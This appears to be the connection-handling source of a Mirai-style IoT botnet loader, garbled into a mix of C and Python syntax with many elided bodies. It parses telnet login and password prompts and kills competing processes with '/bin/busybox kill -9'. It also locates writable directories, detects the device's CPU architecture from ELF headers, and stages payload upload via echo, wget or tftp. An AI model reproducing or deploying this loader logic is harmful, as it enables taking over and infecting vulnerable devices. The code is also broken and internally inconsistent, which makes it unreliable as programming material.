...
def connection_open(struct connection *conn):
...
def connection_close(struct connection *conn):
    pthread_mutex_lock(&conn.lock)
...
def connection_consume_iacs(struct connection *conn):
    consumed = 0
    ptr = conn.rdbuf
    ...
    while consumed < conn.rdbuf_pos:
        ...
        if *ptr != 0xff:
            ...
            if not can_consume(conn, ptr, 1):
                break
            if ptr[1] == 0xff:
                ptr += 2
                consumed += 2
                continue
            elif ptr[1] == 0xfd:tmp1 = (255, 251, 31);tmp2 = (255, 250, 31, 0, 80, 0, 24, 255, 240)

                if not can_consume(conn, ptr, 2):
                    break
                if ptr[2] != 31:
                    goto iac_wont
...
def connection_consume_login_prompt(struct connection *conn):
    prompt_ending = -1

    for (i = conn.rdbuf_pos; i >= 0; i--)
    {
        if conn.rdbuf[i] == ':' or conn.rdbuf[i] == '>' or conn.rdbuf[i] == '$' or conn.rdbuf[i] == '#' or conn.rdbuf[i] == '%':
#ifdef DEBUG
    ...
    if prompt_ending == -1:
        ...
        if ((tmp = util_memsearch(conn.rdbuf, conn.rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp
        elif ((tmp = util_memsearch(conn.rdbuf, conn.rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp
...
def connection_consume_password_prompt(struct connection *conn):
    prompt_ending = -1
...
def connection_consume_prompt(struct connection *conn):
    prompt_ending = -1
...
def connection_consume_verify_login(struct connection *conn):
    prompt_ending = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
...
def connection_consume_psoutput(struct connection *conn):
    start = conn.rdbuf

    offset = util_memsearch(conn.rdbuf, conn.rdbuf_pos, TOKEN_RESPONSE, len(TOKEN_RESPONSE))

    for i in range((offset == -1 ? conn.rdbuf_pos : offset)):
        if conn.rdbuf[i] == '\r':
            conn.rdbuf[i] = 0
        elif conn.rdbuf[i] == '\n':
            option_on = 0
            BOOL last_character_was_space = False
            pid_str = NULL; proc_name = NULL

            conn.rdbuf[i] = 0
            for ii in range((()&conn.rdbuf[i] - start)):
                if start[ii] == ' ' or start[ii] == '\t' or start[ii] == 0:
                    if option_on > 0 and not last_character_was_space:
                        option_on += 1
                    start[ii] = 0
                    ...
                    if option_on == 0:
                        pid_str = start[ii]
                        option_on += 1
                    elif option_on >= 3 and option_on <= 5 and last_character_was_space:
                        proc_name = start[ii]
                    last_character_was_space = False

            if pid_str != NULL and proc_name != NULL:
                pid = int(pid_str)
                len_proc_name = len(proc_name)

#ifdef DEBUG
                printf("pid: %d, proc_name: %s\n" % (pid, proc_name))
#endif

                if (pid != 1 and (strcmp(proc_name, "init") == 0 or strcmp(proc_name, "[init]") == 0)) # Kill the second init
                    util_sockprintf(conn.fd, "/bin/busybox kill -9 %d\r\n" % (pid))
                elif pid > 400:
                    num_count = 0
                    num_alphas = 0

                    for ii in range(len_proc_name):
                        if proc_name[ii] >= '0' and proc_name[ii] <= '9':
                            num_count += 1
                        elif (proc_name[ii] >= 'a' and proc_name[ii] <= 'z') or (proc_name[ii] >= 'A' and proc_name[ii] <= 'Z'):
                            num_alphas += 1
                            break

                    if num_alphas == 0 and num_count > 0:
    ...
    if offset == -1:
        ...
        for i in range(conn.rdbuf_pos):
            if conn.rdbuf[i] == 0:
                conn.rdbuf[i] = ' '
        return offset

def connection_consume_mounts(struct connection *conn):
    linebuf_pos = 0; num_whitespaces = 0
    prompt_ending = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))

    if prompt_ending == -1:
        return 0

    for i in range(prompt_ending):
        ...
        if conn.rdbuf[i] == '\n':
            ...
            if util_memsearch(mnt_info, len(mnt_info:, "rw", 2) != -1)
            {
            ...
            dirs_end_line:
            linebuf_pos = 0
        elif conn.rdbuf[i] == ' ' or conn.rdbuf[i] == '\t':
...
def connection_consume_written_dirs(struct connection *conn):
    total_offset = 0
    BOOL found_writeable = False

    if (end_pos = util_memsearch(conn.rdbuf, conn.rdbuf_pos, TOKEN_RESPONSE, len(TOKEN_RESPONSE))) == -1:
        return 0

    while True:

        offset = util_memsearch(conn.rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, len(VERIFY_STRING_CHECK))
        if offset == -1:
            break
        total_offset += offset
        ...
        if not found_writeable:
            if pch_len < 31:
                conn.info.writedir = pch
...
def connection_consume_copy_op(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))

    if offset == -1:
        return 0
    return offset

def connection_consume_arch(struct connection *conn):
    if not conn.info.has_arch:
        ...
        if ehdr.e_machine == EM_ARM or ehdr.e_machine == EM_AARCH64:
            strcpy(conn.info.arch, "arm")
        elif ehdr.e_machine == EM_MIPS or ehdr.e_machine == EM_MIPS_RS3_LE:
            if ehdr.e_ident[EI_DATA] == EE_LITTLE:
                strcpy(conn.info.arch, "mpsl")
            else:
                strcpy(conn.info.arch, "mips")
        elif ehdr.e_machine == EM_386 or ehdr.e_machine == EM_486 or ehdr.e_machine == EM_860 or ehdr.e_machine == EM_X86_64:
            strcpy(conn.info.arch, "x86")
        elif ehdr.e_machine == EM_SPARC or ehdr.e_machine == EM_SPARC32PLUS or ehdr.e_machine == EM_SPARCV9:
            strcpy(conn.info.arch, "spc")
        elif ehdr.e_machine == EM_68K or ehdr.e_machine == EM_88K:
            strcpy(conn.info.arch, "m68k")
        elif ehdr.e_machine == EM_PPC or ehdr.e_machine == EM_PPC64:
            strcpy(conn.info.arch, "ppc")
        elif ehdr.e_machine == EM_SH:
        ...
        if (offset = util_memsearch(conn.rdbuf, conn.rdbuf_pos, TOKEN_RESPONSE, len(TOKEN_RESPONSE))) != -1:
            return offset
        if conn.rdbuf_pos > 7168:
            # Hack drain buffer
            memmove(conn.rdbuf, conn.rdbuf + 6144, conn.rdbuf_pos - 6144)
...
def connection_consume_arm_subtype(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))

    if offset == -1:
        return 0

    if (util_memsearch(conn.rdbuf, offset, "ARMv7", 5) != -1 or util_memsearch(conn.rdbuf, offset, "ARMv6", 5) != -1)
    {
#ifdef DEBUG
...
def connection_consume_upload_methods(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
    ...
    elif (util_memsearch(conn.rdbuf, offset, "tftp: applet not found", 22) == -1)
...
def connection_upload_echo(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
...
def connection_upload_wget(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
...
def connection_upload_tftp(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
...
def connection_verify_payload(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(EXEC_RESPONSE))
...
def connection_consume_cleanup(struct connection *conn):
    offset = util_memsearch(conn.rdbuf; conn.rdbuf_pos len(TOKEN_RESPONSE))
...
static BOOL can_consume(struct connection *conn, ptr, amount)
    end = conn.rdbuf + conn.rdbuf_pos
